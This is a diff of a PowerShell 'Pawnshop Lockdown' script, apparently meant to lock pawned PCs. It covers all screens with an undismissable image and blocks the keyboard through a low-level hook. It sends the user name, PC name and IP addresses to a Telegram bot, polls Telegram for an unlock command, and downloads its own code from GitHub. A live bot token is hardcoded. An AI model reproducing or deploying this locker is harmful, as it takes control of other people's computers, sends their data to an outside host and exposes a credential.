@@ -1,26 +1,39 @@
-# ==========================
-# Pawnshop Lockdown v2.6 (Stable)
-# ==========================
+# ============================
+# Pawnshop Lockdown v2.7 (Self-Saving + Lock/Unlock)
+# ============================
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 # --- CONFIG ---
-$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
-$tempImagePath = "$env:TEMP\pawnlock.jpg"
-$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
-$chatID   = "656189986"
-$user     = $env:USERNAME
-$pc       = $env:COMPUTERNAME
-$unlockCmd = "/unlock$user"
+$githubURL   = "https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1"
+$localFolder = "$env:ProgramData\PawnshopLock"
+$localFile   = "$localFolder\pawnlock.ps1"
+$imageURL    = "https://raw.githubusercontent.com/diezul/x/main/1.png"
+$tempImg     = "$env:TEMP\pawnlock.jpg"
+$botToken    = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
+$chatID      = "656189986"
+$user        = $env:USERNAME
+$pc          = $env:COMPUTERNAME
+$unlockCmd   = "/unlock$user"
+
+# --- SELF-SAVE SCRIPT ---
+try {
+    if (-not (Test-Path $localFolder)) {
+        New-Item -ItemType Directory -Path $localFolder -Force | Out-Null
+    }
+    Invoke-WebRequest -Uri $githubURL -OutFile $localFile -UseBasicParsing
+} catch {}
 
 # --- DOWNLOAD IMAGE ---
 try {
-    Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing
+    Invoke-WebRequest -Uri $imageURL -OutFile $tempImg -UseBasicParsing
 } catch {}
 
 # --- SEND TELEGRAM MESSAGE ---
 function Send-Telegram {
     try {
         $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
-            $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80'
+            $_.IPAddress -notmatch '^127|169\.254|^0\.|255|fe80'
         })[0].IPAddress
     } catch { $ipLocal = "n/a" }
 
@@ -28,13 +41,13 @@ function Send-Telegram {
         $ipPublic = Invoke-RestMethod "https://api.ipify.org"
     } catch { $ipPublic = "n/a" }
 
-    $msg = "PC $user ($pc) locked.`nIP: $ipLocal | $ipPublic`nUnlock: $unlockCmd"
+    $msg = "🔒 PC $user ($pc) locked.`nIP: $ipLocal | $ipPublic`nUnlock: $unlockCmd"
     $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
     Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
 }
 Send-Telegram
 
-# --- KEYBOARD BLOCK ---
+# --- KEYBOARD BLOCKER ---
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -46,14 +59,10 @@ public class KeyBlocker {
     private const int WM_KEYDOWN = 0x0100;
     private const int WM_SYSKEYDOWN = 0x0104;
 
-    [DllImport("user32.dll")]
-    private static extern IntPtr SetWindowsHookEx(int idHook, KProc lpfn, IntPtr hMod, uint tid);
-    [DllImport("user32.dll")]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-    [DllImport("user32.dll")]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr GetModuleHandle(string name);
+    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, KProc lpfn, IntPtr hMod, uint tid);
+    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string name);
 
     public static void Block() { hookId = SetHook(proc); }
     public static void Unblock() { UnhookWindowsHookEx(hookId); }
@@ -68,8 +77,8 @@ public class KeyBlocker {
     private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
-            if (vkCode == 0x43) Environment.Exit(0); // C key exits
-            return (IntPtr)1;
+            if (vkCode == 0x43) Environment.Exit(0); // C key allowed
+            return (IntPtr)1; // block others
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
@@ -77,7 +86,7 @@ public class KeyBlocker {
 "@
 [KeyBlocker]::Block()
 
-# --- FULLSCREEN FORMS ---
+# --- FULLSCREEN DISPLAY ---
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $f = New-Object Windows.Forms.Form -Property @{
@@ -86,16 +95,12 @@ $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
         Cursor = [System.Windows.Forms.Cursors]::None; BackColor = 'Black'
     }
     $pb = New-Object Windows.Forms.PictureBox -Property @{
-        Image = [System.Drawing.Image]::FromFile($tempImagePath)
-        Dock = 'Fill'; SizeMode = 'StretchImage'
+        Image = [System.Drawing.Image]::FromFile($tempImg); Dock = 'Fill'; SizeMode = 'StretchImage'
     }
-    $f.Controls.Add($pb)
-    $f.Add_Deactivate({ $_.Activate() })
-    $f.Show()
-    $f
+    $f.Controls.Add($pb); $f.Add_Deactivate({ $_.Activate() }); $f.Show(); $f
 }
 
-# --- TELEGRAM POLL ---
+# --- TELEGRAM UNLOCK LISTENER ---
 $offset = 0
 try {
     $start = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -TimeoutSec 5
@@ -104,7 +109,7 @@ try {
     }
 } catch {}
 
-$timer = New-Object System.Windows.Forms.Timer
+$timer = New-Object Windows.Forms.Timer
 $timer.Interval = 4000
 $timer.Add_Tick({
     try {
@@ -119,7 +124,7 @@ $timer.Add_Tick({
 })
 $timer.Start()
 
-# --- START LOOP ---
+# --- KEEP SCRIPT RUNNING ---
 [System.Windows.Forms.Application]::Run()
 
 # --- CLEANUP ---
